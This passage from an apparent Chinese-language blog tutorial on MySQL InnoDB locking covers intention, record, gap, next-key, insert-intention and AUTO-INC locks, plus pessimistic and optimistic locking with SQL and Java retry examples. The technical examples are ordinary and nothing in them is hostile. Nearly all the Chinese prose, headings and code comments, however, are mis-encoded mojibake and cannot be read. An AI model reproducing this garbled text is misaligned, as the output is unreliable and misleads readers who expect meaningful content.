-- çæ­£æ£åºå­ï¼MySQL 8 æ¯æåå­åæ³ï¼ä¹å¯æä¸¤æ­¥ï¼
UPDATE merchandise SET stock = stock - 1 WHERE id = 123 AND stock &gt; 0;
</code></pre>
<h3 id="æåé">æåé</h3>
<p><strong>é¤äºSéï¼å±äº«éï¼åXéï¼æä»éï¼ä¹å¤ï¼InnoDBè¿æä¸¤ç§éï¼å°±æ¯ISéåIXéï¼SåXåé¢çIæ¯<code>Intention</code>çææï¼å³æåéï¼ISå°±æ¯æåå±äº«éï¼IXå°±æ¯æåæä»éã</strong></p>
<p>å¨MySQLçInnoDBå¼æä¸­ï¼æ ¹æ®éçä¸åèå´ä¹æ¯æåºåçï¼ä¾å¦ï¼è¡¨çº§éãé´ééãè¡çº§éç­ãå½å¤ä¸ªäºå¡åæ¶è®¿é®åä¸ä¸ªæ°æ®æ¶ï¼å¤ä¸ªäºå¡åæ¶ç³è¯·è·åéï¼é£ä¹å°±æå¯è½å¯¼è´äºç¸é»å¡çè³äº§çæ­»éã</p>
<p>ä¾å¦ï¼</p>
<blockquote>
<p>äºå¡T1å¯¹è¡¨Table1ä¸­çä¸è¡å ä¸äºè¡çº§éï¼æ­¤æ¶è¿è¡è®°å½å°±ä¸è½è¢«å¶ä»äºå¡åäºã<br>
äºå¡T2ç³è¯·å¯¹Table1å¢å äºè¡¨çº§éï¼è¥ç³è¯·æåäºï¼é£ä¹å°±å¯ä»¥ä¿®æ¹è¡¨ä¸­çä»»æä¸è¡è®°å½ã<br>
è¿å°±è·äºå¡T1åçäºå²çªã<br>
é£ä¹ï¼æ³è¦è§£å³è¿ä¸ªé®é¢ï¼å°±éè¦è®©äºå¡T2å¨å¯¹Table1å¢å è¡¨çº§éçæ¶åï¼åå¤æ­ä¸ä¸æ¯ä¸æ¯æäºå¡å¢å è¿è¡çº§éãä½æ¯ï¼äºå¡T2æ»ä¸è½éæ¡å¤æ­æ¯å¦æå éå§?</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200421506-515857039.png" alt="image" loading="lazy"></p>
<p>å æ­¤ï¼ä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼MySQLå¼å¥äºæåéæºå¶ï¼<strong><code>æåéæ¯æ°æ®åºç®¡çç³»ç»ä¸­ç¨äºå®ç°éåè®®çä¸ç§éæºå¶ï¼ä¸»è¦æ¯ç¨æ¥å¤çä¸åç²åº¦éï¼å¦è¡éåè¡¨éï¼ä¹é´çå¹¶åæ§é®é¢ï¼èåç²åº¦çéä¹é´ä¸è¬æ¯éè¿äºæ¥æ¥è§£å³å¹¶åçï¼</code></strong>ã</p>
<blockquote>
<ul>
<li>æåéä¸åéå®èµæºçæä½ï¼ä¸»è¦æ¯éç¥çä½ç¨ï¼é²æ­¢å¨å·²ç»å éçæ°æ®ä¸è®¾ç½®ä¸å¼å®¹çéã</li>
<li>æåéä¸æ¯ç´æ¥ç±ç¨æ·è¯·æ±çï¼èæ¯MySQLç®¡ççã</li>
</ul>
</blockquote>
<p>å½ä¸ä¸ªäºå¡æ³è·åä¸ä¸ªè¡çº§éæè¡¨çº§éæ¶ï¼MySQLä¼èªå¨è·åç¸åºçè¡¨çæåéãè¿æ¶ï¼å¶ä»äºå¡åè¯·æ±è·åè¡¨éæ¶ï¼å°±å¯ä»¥ååºäºè¿ä¸ªæåéæ¥åç°æ¯å¦å·²ç»å è¿éå¹¶ä¸æªéæ¾ï¼å¹¶æ ¹æ®è¯¥éçç±»å(æåå±äº«é/æåæä»é)æ¥å¤æ­èªå·±æ¯å¦å¯ä»¥è·åéãè¿æ ·å¯ä»¥å¨ä¸é»å¡å¶ä»äºå¡çæåµä¸ï¼ä¸ºå½åäºå¡éå®èµæºã</p>
<h4 id="ä¸¾ä¸ª">ä¸¾ä¸ªð°ï¼</h4>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200556283-98907230.png" alt="image" loading="lazy"></p>
<p>1ãäºå¡ T1 æ§è¡</p>
<pre><code class="language-sql">SELECT * FROM table1 WHERE id=1 FOR UPDATE;
</code></pre>
<p>InnoDB åå¯¹è¡¨ table1 å  IXï¼åå¯¹ id=1 çè¡å  X éã</p>
<p>2ãæ­¤æ¶äºå¡ T2 æ³ ç³è¯·è¡¨é</p>
<pre><code class="language-sql">LOCK TABLES table1 WRITE;
</code></pre>
<p>éç­å¾ï¼å ä¸ºæ£æµå°è¡¨ table1 ä¸å·²æ IXï¼ç¥éâ<strong><code>table1</code>éé¢æè¡æ­£è¢«æä»éä½</strong>âï¼äºæ¯é»å¡ã<br>
3ãäºå¡T1æäº¤æåï¼éæ¾table1çIXéï¼è¿ä¸ªæ¶åT2è¢«å¤éæåè·å<code>table1</code>çIXéã</p>
<p>ä»è¿ä¸ªä¾å­ä¸­å¯ä»¥çåºæ¥ï¼<strong>æåéæ¯ä¸ªè¡¨çº§éï¼å¹¶ä¸ä¼å¨è§¦åæåéçäºå¡æäº¤æåæ»åéæ¾ã</strong></p>
<h4 id="æåéæä¸¤ç§æåå±äº«éæåæä»é">æåéæä¸¤ç§ï¼<strong>æåå±äº«é</strong>ã<strong>æåæä»é</strong></h4>
<ul>
<li>
<p><strong>æåå±äº«éï¼ISï¼</strong>:è¡¨ç¤ºäºå¡æç®å¨èµæºä¸è®¾ç½®å±äº«é(è¯»é)ãè¿éå¸¸ç¨äºè¡¨ç¤ºäºå¡è®¡åè¯»åèµæºï¼å¹¶ä¸å¸æå¨è¯»åæ¶æå¶ä»äºå¡è®¾ç½®æå®éã</p>
</li>
<li>
<p><strong>æåæå®éï¼IXï¼</strong>:è¡¨ç¤ºäºå¡æç®å¨èµæºä¸è®¾ç½®æå®é(åé)ãè¿è¡¨ç¤ºäºå¡è®¡åä¿®æ¹èµæºï¼å¹¶ä¸å¸ææå¶ä»äºå¡åæ¶è®¾ç½®å±äº«ææå®éã</p>
</li>
</ul>
<p>è¿ä¸¤ç§æåéçå¼å®¹æåµå¦ä¸ï¼</p>
<table>
<thead>
<tr>
<th>å·²ææ \ è¯·æ±</th>
<th>ISï¼æåå±äº«éï¼</th>
<th>IXï¼æåæä»éï¼</th>
<th>Sï¼è¡¨çº§å±äº«ï¼</th>
<th>Xï¼è¡¨çº§æä»ï¼</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ISï¼æåå±äº«é)</strong></td>
<td>å¼å®¹</td>
<td>å¼å®¹</td>
<td>å¼å®¹</td>
<td>å²çª</td>
</tr>
<tr>
<td><strong>IXï¼æåæä»éï¼</strong></td>
<td>å¼å®¹</td>
<td>å¼å®¹</td>
<td>å¼å®¹</td>
<td>å²çª</td>
</tr>
<tr>
<td><strong>Sï¼è¡¨çº§å±äº«ï¼</strong></td>
<td>å¼å®¹</td>
<td>å²çª</td>
<td>å¼å®¹</td>
<td>å²çª</td>
</tr>
<tr>
<td><strong>Xï¼è¡¨çº§æä»ï¼</strong></td>
<td>å²çª</td>
<td>å²çª</td>
<td>å²çª</td>
<td>å²çª</td>
</tr>
</tbody>
</table>
<h3 id="è®°å½érecord-lock">è®°å½éï¼Record Lockï¼</h3>
<p>Record Lock è§£éä¸ºè®°å½éï¼æ¯å ä¸ºå®åªå¯¹ç´¢å¼è®°å½å éã<br>
ä¾å¦ï¼</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id = 5 FOR UPDATE;
</code></pre>
<p>ä¸é¢è¿ä¸ªSQLä¼å¯¹ id = 5è¿æ¡è®°å½å éï¼ä¸»è¦å°±æ¯ä¸ºäºé²æ­¢å¶ä»äºå¡ï¼å¯¹id =5è¿æ¡è®°å½è¿è¡æå¥ãæ´æ°ãå é¤ç­æä½ã</p>
<p>Record Lock è®°å½éå¯ä»¥æ¯<strong>å±äº«é(Sé)</strong>æ<strong>æä»é(Xé)</strong>ã</p>
<blockquote>
<p>æä¸ç¹éè¦æ³¨æçæ¯ï¼Record Lockéçä¸æ¯è¿è¡è®°å½ï¼èæ¯éç´¢å¼è®°å½ãå¹¶ä¸Record lockéä¸åªéç´¢å¼!<br>
å¦ææ²¡æç´¢å¼æä¹å?å¯¹äºè¿ç§æåµï¼InnoDBä¼åå»ºä¸ä¸ªéèçèç°ç´¢å¼ï¼å¹¶ä½¿ç¨è¿ä¸ªç´¢å¼è¿è¡è®°å½éå®ã<br>
å¦ææä»¬å¨ä¸å¼ è¡¨ä¸­æ²¡æå®ä¹ä¸»é®ï¼é£ä¹ï¼MySQLä¼é»è®¤éæ©ä¸ä¸ªå¯ä¸çéç©ºç´¢å¼ä½ä¸ºèç°ç´¢å¼ãå¦ææ²¡æéåçéç©ºå¯ä¸ç´¢å¼ï¼åä¼åå»ºä¸ä¸ªéèçä¸»é®(row_id)ä½ä¸ºèç°ç´¢å¼ã</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200658726-1914962034.png" alt="image" loading="lazy"></p>
<h3 id="gap-locké´éé">Gap Lockï¼é´ééï¼</h3>
<p><strong>Gap Lockï¼é´ééï¼æ¯å¨ç´¢å¼è®°å½ä¹é´çé´éä¸çéï¼æèå¨ç¬¬ä¸ä¸ªç´¢å¼è®°å½ä¹åãæåä¸ä¸ªç´¢å¼è®°å½ä¹åçé´éä¸å éã</strong></p>
<p><strong>Gap Lock éä½çæ¯ç´¢å¼è®°å½ä¹é´çå¼åºé´ï¼ä¸åå«è®°å½æ¬èº«ã</strong></p>
<blockquote>
<p>Gapä¹å¯ä»¥çè§£ä¸ºInnoDBçç´¢å¼æ°æ®ç»æä¸­å¯ä»¥æå¥æ°å¼çä½ç½®ã</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200736451-1804857824.png" alt="image" loading="lazy"></p>
<p>ç¤ºä¾ï¼</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id = 7 FOR UPDATE;
</code></pre>
<p>ç±äºç´¢å¼è®°å½ä¸å­å¨ï¼å Gap Lockï¼åºé´(5,10)ãè¿æ ·å°±è½é²æ­¢å¶ä»äºå¡å¨é´éä¸­æå¥æ°è®°å½ã</p>
<h3 id="next-key-lock-ä¸´é®é">Next Key Lock ï¼ä¸´é®éï¼</h3>
<p><strong>Next-Key Lockæ¯ç´¢å¼è®°å½ä¸çè®°å½éåç´¢å¼è®°å½ä¹åé´éä¸çé´ééçç»åã</strong><br>
<img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200803021-1764134796.png" alt="image" loading="lazy"></p>
<p>å·¥ä½ç¤ºä¾ï¼</p>
<pre><code class="language-sql">SELECT * FROM users WHERE age = 10 FOR UPDATE;
</code></pre>
<p><strong>å¦æä¸é¢è¿ä¸ªSQLä¸­usersè¡¨çageä¸ºæ®éç´¢å¼ï¼é£ä¹æ§è¡è¿ä¸ªSQLçæ¶åï¼ä¼æ·»å Next-Key Lockï¼å¹¶éä½ï¼5,10]è¿ä¸ªèå´ï¼å·¦å¼å³é­ãä¸»è¦æ¯å¯¹ageç´¢å¼ï¼(5,10]çNext-Key Lockï¼å¯¹ä¸»é®ç´¢å¼ï¼id=10çè®°å½é</strong>ã</p>
<h3 id="å éè§åä¸æ¶æº">å éè§åä¸æ¶æº</h3>
<h4 id="å éåºæ¬åå">å éåºæ¬ååï¼</h4>
<ol>
<li>ææéé½æ¯å å¨ç´¢å¼ä¸çã</li>
<li>å éçåºæ¬åä½æ¯ Next-Key Lockã</li>
<li>æ¥è¯¢è¿ç¨ä¸­è®¿é®å°çå¯¹è±¡é½ä¼å éã</li>
<li>å éé¡ºåºæ¯ä»å·¦åå³ï¼ç´å°ç¬¬ä¸ä¸ªä¸æ»¡è¶³æ¡ä»¶çè®°å½ã</li>
</ol>
<blockquote>
<p>è¿äºéé½æ¯MySQLçInnoDBèªå¨å ä¸çï¼ä¸éè¦ç¨æ·æå¨æä½ï¼ä½æ¯æä»¬å¨æ¥å¸¸ä½¿ç¨æ°æ®åºçæ¶åè¦æç½å éçååã</p>
</blockquote>
<h4 id="ä¸ååºæ¯çå éè§å">ä¸ååºæ¯çå éè§åï¼</h4>
<ol>
<li><strong>ç­å¼æ¥è¯¢ (=)</strong><br>
<strong>å¯ä¸ç´¢å¼/ä¸»é®</strong>ï¼Next-Key Lock éåä¸º Record Lock<br>
<strong>æ®éç´¢å¼</strong>ï¼ä¿æ Next-Key Lockï¼å·¦å³é´éé½ä¸è½ä¼åæ</li>
<li><strong>èå´æ¥è¯¢ (&gt;ã&lt;ã&gt;=ã&lt;=)</strong><br>
<strong>å¯ä¸ç´¢å¼/ä¸»é®</strong>ï¼ä¿æ Next-Key Lockï¼ä¸è¿è¡ä¼å<br>
<strong>æ®éç´¢å¼</strong>ï¼åæ ·ä¿æ Next-Key Lock</li>
<li><strong>è®°å½ä¸å­å¨çæåµ</strong><br>
ä¼å¯¹æ«æå°çç¬¬ä¸ä¸ªä¸æ»¡è¶³æ¡ä»¶çè®°å½å  Gap Lock</li>
</ol>
<h4 id="å·¥ä½åºæ¯ç¤ºä¾">å·¥ä½åºæ¯ç¤ºä¾</h4>
<p>ä¾å¦æä¸ä¸ªusersè¡¨å­æ®µä¸ç°ææ°æ®å¦ä¸è¡¨æç¤º</p>
<table>
<thead>
<tr>
<th>id</th>
<th>age</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>5</td>
<td>Tom</td>
</tr>
<tr>
<td>5</td>
<td>10</td>
<td>Jack</td>
</tr>
<tr>
<td>10</td>
<td>15</td>
<td>Rose</td>
</tr>
<tr>
<td>15</td>
<td>20</td>
<td>Mike</td>
</tr>
</tbody>
</table>
<h5 id="åºæ¯ä¸ç­å¼æ¥è¯¢å¯ä¸ç´¢å¼">åºæ¯ä¸ï¼ç­å¼æ¥è¯¢ï¼å¯ä¸ç´¢å¼ï¼</h5>
<pre><code class="language-sql">SELECT * FROM users WHERE id = 5 FOR UPDATE;
</code></pre>
<p>å éæåµï¼</p>
<ul>
<li>ç±äºidæ¯ä¸»é®ï¼å¯ä¸ç´¢å¼ï¼ï¼Next-Key Lockéåä¸ºRecord Lock</li>
<li>åªå¨id=5çè®°å½ä¸å Xåè®°å½é</li>
</ul>
<h5 id="åºæ¯äºç­å¼æ¥è¯¢æ®éç´¢å¼">åºæ¯äºï¼ç­å¼æ¥è¯¢ï¼æ®éç´¢å¼ï¼</h5>
<pre><code class="language-sql">SELECT * FROM users WHERE age = 10 FOR UPDATE;
</code></pre>
<p>å éæåµï¼</p>
<ul>
<li>å¯¹ageç´¢å¼ï¼(5,10]çNext-Key Lock</li>
<li>å¯¹ä¸»é®ç´¢å¼ï¼id=5çè®°å½é</li>
<li>å ä¸ºæ¯æ®éç´¢å¼ï¼é´éä¸è½è¢«ä¼åæ</li>
</ul>
<h5 id="åºæ¯ä¸èå´æ¥è¯¢">åºæ¯ä¸ï¼èå´æ¥è¯¢</h5>
<pre><code class="language-sql">SELECT * FROM users WHERE id &gt; 5 AND id &lt;= 15 FOR UPDATE;
</code></pre>
<p>å éæåµï¼</p>
<ul>
<li>(5,10]çNext-Key Lock</li>
<li>(10,15]çNext-Key Lock</li>
<li>(15,20]çNext-Key Lockï¼ä¼æ«æå°ç¬¬ä¸ä¸ªä¸æ»¡è¶³æ¡ä»¶çè®°å½ï¼</li>
</ul>
<h5 id="åºæ¯åè®°å½ä¸å­å¨çæåµ">åºæ¯åï¼è®°å½ä¸å­å¨çæåµ</h5>
<pre><code class="language-sql">SELECT * FROM users WHERE id = 7 FOR UPDATE;
</code></pre>
<p>å éæåµï¼<strong>ç±äºè®°å½ä¸å­å¨ï¼å Gap Lockï¼(5,10)</strong></p>
<h4 id="ä¸åéç¦»çº§å«ä¸å¯å éçè¡ä¸º">ä¸åéç¦»çº§å«ä¸å¯å éçè¡ä¸º</h4>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200957494-294883624.png" alt="image" loading="lazy"></p>
<h3 id="æå¥æåéinsert-intention-lock">æå¥æåéï¼Insert Intention Lockï¼</h3>
<p><strong>æå¥æåéæ¯ä¸ç§ç¹æ®çé´ééï¼è¡¨ç¤ºäºå¡è®¡åå¨æä¸ªé´éæå¥æ°æ®çæå¾ã</strong></p>
<p>è¿ç§éè¡¨æäºæå¥çæå¾ï¼ä»¥è¿æ ·ä¸ç§æ¹å¼ï¼å¦æå¤ä¸ªäºå¡æå¥å°åä¸ç´¢å¼é´éä¸­ä½ä¸å¨é´éåçç¸åä½ç½®æå¥ï¼åå®ä»¬ä¸éè¦ç¸äºç­å¾ã</p>
<p>åè®¾æç´¢å¼è®°å½çå¼ä¸º4å7ãåå«å°è¯æå¥å¼ä¸º5å6çä¸åäºå¡ï¼å¨è·åæå¥è¡çç¬å éä¹åï¼åèªç¨æå¥æåééå®4å7ä¹é´çé´éï¼ä½ç±äºè¡ä¸å²çªï¼æä»¥å®ä»¬ä¸ä¼ç¸äºé»å¡ãä½æ¯å¦æä»ä»¬çé½è¦æå¥6ï¼é£ä¹å°±ä¼éè¦é»å¡äºã</p>
<p>æå¥æåéï¼æ¯ä¸ç§ä¼ååçé´ééï¼ä¸»è¦ç®çæ¯<strong>ä¼åå¹¶åï¼åè®¸ä¸å²çªçæå¥</strong>ãå®ä¸é´éééåä½¿ç¨ï¼æ¢é²æ­¢äºå¹»è¯»åæåäºå¹¶åã</p>
<blockquote>
<p>è½ç¶è¿ä¸ªéçåå­å«æå¥æåéï¼ä½æ¯å®æ¯è¡çº§éï¼è·æåéè¿ä¸ªè¡¨çº§éï¼æ¯æ²¡ä»ä¹å³ç³»çã</p>
</blockquote>
<h3 id="auto-inc-é">AUTO-INC é</h3>
<p>AUTO-INCéæ¯ä¸ç§ç¹æ®çè¡¨çº§éï¼ç±æå¥å¸¦æAUTOINCREMENT åçè¡¨çäºå¡è·åã<br>
å¨æç®åçæåµä¸.å¦æä¸ä¸ªäºå¡æ­£å¨åè¡¨ä¸­æå¥å¼ï¼ä»»ä½å¶ä»äºå¡é½å¿é¡»ç­å¾ï¼ä»¥ä¾¿æ§è¡å®ä»¬èªå·±çæå¥æä½ï¼è¿æ ·ç¬¬ä¸ä¸ªäºå¡æå¥çè¡å°±ä¼æ¥æ¶å°è¿ç»­çä¸»é®å¼ã</p>
<p>æä¸»è¦æ¯<strong>ç¨äºä¿æ¤AUTO_INCREMENTåçèªå¢å¼çæè¿ç¨ï¼ç¡®ä¿å¹¶åæå¥æ¶èªå¢å¼çå¯ä¸æ§åè¿ç»­æ§ï¼é²æ­¢å¤ä¸ªäºå¡çæç¸åçèªå¢å¼</strong></p>
<p>åä¸ç§éæ¨¡å¼ï¼<br>
éè¿åæ° <code>innodb_autoinc_lock_mode</code> æ§å¶ï¼</p>
<table>
<thead>
<tr>
<th>æ¨¡å¼</th>
<th>å¼</th>
<th>æè¿°</th>
<th>ç¹ç¹</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ä¼ ç»æ¨¡å¼</strong></td>
<td>0</td>
<td>è¡¨çº§é</td>
<td>å®å¨æ§æé«ï¼æ§è½æä½</td>
</tr>
<tr>
<td><strong>è¿ç»­æ¨¡å¼</strong></td>
<td>1</td>
<td>è½»éçº§äºæ¥é</td>
<td>å¹³è¡¡å®å¨æ§åæ§è½</td>
</tr>
<tr>
<td><strong>æ éæ¨¡å¼</strong></td>
<td>2</td>
<td>é¢ååéèªå¢å¼</td>
<td>æ§è½æé«ï¼å¯è½ä¸è¿ç»­</td>
</tr>
</tbody>
</table>
<h3 id="æ²è§é">æ²è§é</h3>
<p>æ°æ®åºä¸­çéï¼æç§ä½¿ç¨æ¹å¼æ¥åï¼ä¹å¯åä¸º<strong>æ²è§é</strong>å<strong>ä¹è§é</strong>ã</p>
<p>æ²è§éçæ ¸å¿ææ³ï¼<strong>"æ²è§"å°è®¤ä¸ºæ°æ®ä¸å®ä¼è¢«å¶ä»äºå¡ä¿®æ¹ï¼æä»¥æåå é</strong>ãæä»¥å¨æä½æ¶æ¯åè·åéï¼åè¿è¡ä¸å¡æä½ãå£è¯å°±æ¯â<strong>ä¸éäºæ¥ä¸æ´æ°</strong>âã</p>
<h4 id="æ²è§éç¤ºä¾è¡çº§é">æ²è§éç¤ºä¾ï¼è¡çº§éï¼</h4>
<pre><code class="language-sql">-- æ²è§éç¤ºä¾
START TRANSACTION;

SELECT * FROM products WHERE id = 1 FOR UPDATE;  -- å æä»é
UPDATE products SET stock = stock - 1 WHERE id = 1;

COMMIT;
</code></pre>
<p>å¨å¯¹id=1çè®°å½ä¿®æ¹åï¼åéè¿for updateçæ¹å¼è¿è¡å éï¼ç¶ååè¿è¡ä¿®æ¹ãè¿å°±æ¯æ¯è¾å¸åçæ²è§éç­ç¥ã</p>
<p>å¦æä»¥ä¸ä¿®æ¹åºå­çä»£ç åçå¹¶åï¼åä¸æ¶é´åªæä¸ä¸ªçº¿ç¨å¯ä»¥å¼å¯äºå¡å¹¶è·å¾id=1çéï¼å¶å®çäºå¡å¿é¡»ç­æ¬æ¬¡äºå¡æäº¤ä¹åæè½æ§è¡ãè¿æ ·æä»¬å¯ä»¥ä¿è¯å½åçæ°æ®ä¸ä¼è¢«å¶å®äºå¡ä¿®æ¹ã</p>
<h4 id="æ²è§éç¤ºä¾è¡¨çº§é">æ²è§éç¤ºä¾ï¼è¡¨çº§éï¼</h4>
<pre><code class="language-sql">-- è¡¨çº§é
LOCK TABLES products WRITE;
-- æ§è¡ä¸å¡æä½
......
-- è¡¨è§£é
UNLOCK TABLES;
</code></pre>
<p>å½å¯¹productsè¡¨è¿è¡æä½çæ¶åï¼ä¼åå¯¹è¡¨å ä¸éï¼ç¶ååæä½ãè¿æ ·å¶ä»ä¸å¡å°±ä¸å¯ä»¥å¨å¯¹è¡¨ä¸­çæ°æ®è¿è¡ä¿®æ¹äºãä½ç°äºæ²è§çææ³ï¼ä¸å¡ä½¿ç¨æ¹æè§âæ»æåæ°æ³è°å®³æâï¼å äºéä¹åå®å¨ææ´å¢ï¼</p>
<h4 id="æ²è§éå®éåºæ¯ç¤ºä¾-éèäº¤æè½¬è´¦åºæ¯">æ²è§éå®éåºæ¯ç¤ºä¾-éèäº¤æï¼è½¬è´¦åºæ¯ï¼</h4>
<pre><code class="language-sql">-- è½¬è´¦æä½ï¼ä»è´¦æ·Aè½¬100åå°è´¦æ·B
START TRANSACTION;

-- éå®ä»æ¬¾æ¹è´¦æ·
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;
-- ä¸å¡éåæ£æ¥balanceçä½é¢æ¯å¦å¤§äºç­äº100ï¼ç¶ååæ§è¡æ£å
UPDATE accounts SET balance = balance - 100 WHERE id = 1;

-- éå®æ¶æ¬¾æ¹è´¦æ·  
SELECT balance FROM accounts WHERE id = 2 FOR UPDATE;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

COMMIT;
</code></pre>
<h4 id="æ²è§éå®éåºæ¯ç¤ºä¾-åºå­æ£åé²æ­¢è¶å">æ²è§éå®éåºæ¯ç¤ºä¾-åºå­æ£åï¼é²æ­¢è¶åï¼</h4>
<pre><code class="language-sql">-- åååºå­æ£å
START TRANSACTION;

SELECT stock FROM products WHERE id = 1 FOR UPDATE;

-- æ£æ¥åºå­æ¯å¦åè¶³
-- å¦æåè¶³åæ£å
UPDATE products SET stock = stock - 1 WHERE id = 1;

COMMIT;
</code></pre>
<h3 id="ä¹è§é">ä¹è§é</h3>
<p><strong>ä¹è§éæ»æ¯"ä¹è§"å°è®¤ä¸ºæ°æ®ä¸ä¼è¢«å¶ä»äºå¡ä¿®æ¹ï¼ä¸å éç´æ¥æä½ã<br>
ä¼åè¿è¡æä½ï¼æäº¤æ¶æ£æ¥æ¯å¦åçå²çªãä¸»è¦éè¿çæ¬å·ãæ¶é´æ³ç­æ¹å¼æ£æµå²çªã</strong></p>
<blockquote>
<p>MySQL æ¬èº«ä¸æä¾åç½®ä¹è§éï¼éè¦ç¨æ·å¨è¡¨ç»æè®¾è®¡æåºç¨å±éè¿ CAS ææ³èªè¡å®ç°ãCASæ¬è´¨å°±æ¯ä¸é¡¹ä¹è§éææ¯ï¼å½å¤ä¸ªçº¿ç¨å°è¯ä½¿ç¨CASåæ¶æ´æ°åä¸ä¸ªåéæ¶ï¼åªæå¶ä¸­ä¸ä¸ªçº¿ç¨è½æ´æ°åéçå¼ï¼èå¶å®çº¿ç¨é½å¤±è´¥ï¼å¤±è´¥ççº¿ç¨å¹¶ä¸ä¼è¢«æèµ·ï¼èæ¯è¢«åç¥è¿æ¬¡ç«äºä¸­å¤±è´¥ï¼å¹¶å¯ä»¥åæ¬¡å°è¯ã</p>
</blockquote>
<h4 id="æ²è§éç¤ºä¾">æ²è§éç¤ºä¾</h4>
<pre><code class="language-sql">-- 1. æ¥è¯¢æ°æ®æ¶è·åçæ¬å·
SELECT id, name, stock, version FROM products WHERE id = 1;

-- 2. æ´æ°æ¶æ£æ¥çæ¬å·
UPDATE products 
SET stock = stock - 1, version = version + 1 
WHERE id = 1 AND version = æ§çæ¬å·;

-- 3. æ£æ¥æ´æ°æ¯å¦æå
-- å¦æ update æåè®°å½æ°ä¸º0ï¼è¯´ææ°æ®è¢«å¶ä»äºå¡ä¿®æ¹ï¼çæ¬å·å·²ç»ä¸åè¯ç¬¬ä¸æ­¥æ¥åºæ¥çé£ä¸ªçæ¬å·äºã
</code></pre>
<p>å®æ´çç¤ºä¾</p>
<pre><code class="language-sql">-- åå»ºå¸¦æçæ¬å·çè¡¨
CREATE TABLE products (
    id INT PRIMARY KEY,
    name VARCHAR(50),
    stock INT,
    version INT DEFAULT 1
);

-- ä¹è§éæ´æ°è¿ç¨
START TRANSACTION;

-- æ­¥éª¤1ï¼è¯»åæ°æ®åçæ¬å·
SELECT id, stock, version FROM products WHERE id = 1;
-- åè®¾è·åå°ï¼version = 5, stock = 100

-- æ­¥éª¤2ï¼æ§è¡ä¸å¡é»è¾ï¼å¨åºç¨ç¨åºä¸­ï¼
-- è®¡ç®æ°åºå­ï¼new_stock = 100 - 1 = 99

-- æ­¥éª¤3ï¼æ´æ°æ°æ®å¹¶æ£æ¥çæ¬å·
UPDATE products 
SET stock = 99, version = 6 WHERE id = 1 AND version = 5;

-- æ­¥éª¤4ï¼æ£æ¥æ´æ°ç»æ
-- å¦æ update æåè®°å½æ°ä¸º1ï¼æ´æ°æå
-- å¦æ update æåè®°å½æ°ä¸º0ï¼æ°æ®è¢«å¶ä»äºå¡ä¿®æ¹ï¼éè¦éè¯

COMMIT;
</code></pre>
<p>å¨å®éä½¿ç¨è¿ç¨ä¸­ï¼å¯ä»¥ç´æ¥ç¨æ´æ°æ¶é´çæ¶é´æ³æ¥å®ç°ä¹è§éãç¤ºä¾å¦ä¸ï¼</p>
<pre><code class="language-sql">-- ä½¿ç¨æ¶é´æ³å®ç°ä¹è§é
-- æ¥è¯¢åºæ´æ°æ¶é´
SELECT id, stock, updated_at FROM products WHERE id = 1;

-- ç¨æ´æ°æ¶é´æ³åçæ¬å·ï¼åå°ç°å¨æ¶é´æ´æ°ä¸ºææ°çæ¬
UPDATE products 
SET stock = stock - 1, updated_at = NOW() 
WHERE id = 1 AND updated_at = '2025-01-16 10:30:00';
</code></pre>
<p>å¨å®éä¸å¡ä¸­éè¯é½æ¯å¨ä¸å¡å±å¤ççï¼ç¤ºä¾å¦ä¸ï¼</p>
<pre><code class="language-java">// Javaä¸­çä¹è§ééè¯æºå¶
public boolean updateProductStock(Long productId, int quantity) {
    int maxRetries = 3;
    
    for (int i = 0; i &lt; maxRetries; i++) {
        // 1. æ¥è¯¢æ°æ®åçæ¬å·
        Product product = productMapper.selectById(productId);
        
        // 2. å°è¯æ´æ°
        int affectedRows = productMapper.updateStock(
            productId, 
            product.getStock() - quantity,
            product.getVersion()
        );
        
        // 3. æ£æ¥æ´æ°ç»æ
        if (affectedRows &gt; 0) {
            return true; // æ´æ°æå
        }
        
        // 4. æ´æ°å¤±è´¥ï¼ç­æä¼ç åéè¯
        Thread.sleep(100);
    }
    
    return false; // éè¯å¤æ¬¡åä»ç¶å¤±è´¥
}
</code></pre>
<h3 id="æ²è§éä¸ä¹è§éæ»ç»">æ²è§éä¸ä¹è§éæ»ç»</h3>
<h4 id="æ²è§éä¸ä¹è§éå¯¹æ¯">æ²è§éä¸ä¹è§éå¯¹æ¯</h4>
<p><img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120201750503-2023940951.png" alt="image" loading="lazy"></p>
<h4 id="æ²è§éä¸ä¹è§éå®éä½¿ç¨ä¸­çéåå»ºè®®">æ²è§éä¸ä¹è§éå®éä½¿ç¨ä¸­çéåå»ºè®®</h4>
<h5 id="æ²è§ééç¨åºæ¯">æ²è§ééç¨åºæ¯</h5>
<ul>
<li>åæä½é¢ç¹ï¼åå æ¯ &gt; 30%ï¼</li>
<li>å²çªæ¦çé«çä¸å¡</li>
<li>ä¸´çåºæ§è¡æ¶é´é¿ï¼åå«IOæä½ï¼</li>
<li>å¼ºä¸è´æ§è¦æ±ï¼éèäº¤æï¼</li>
</ul>
<h5 id="ä¹è§ééç¨åºæ¯">ä¹è§ééç¨åºæ¯</h5>
<ul>
<li>è¯»æä½é¢ç¹ï¼è¯»å æ¯ &gt; 80%ï¼</li>
<li>å²çªæ¦çä½çä¸å¡</li>
<li>ä¸´çåºæ§è¡æ¶é´ç­ï¼çº¯åå­æä½ï¼</li>
<li>ç³»ç»ååéè¦æ±é«</li>
<li>å¯ä»¥æ¥åå¶å°çéè¯</li>
</ul>
<h5 id="åºç¨æ¡ä¾">åºç¨æ¡ä¾</h5>
<p>æ¡ä¾ä¸ï¼çµååååºå­</p>
<pre><code class="language-sql">-- æ²è§éæ¹æ¡ï¼éåç§æåºæ¯ï¼
START TRANSACTION;
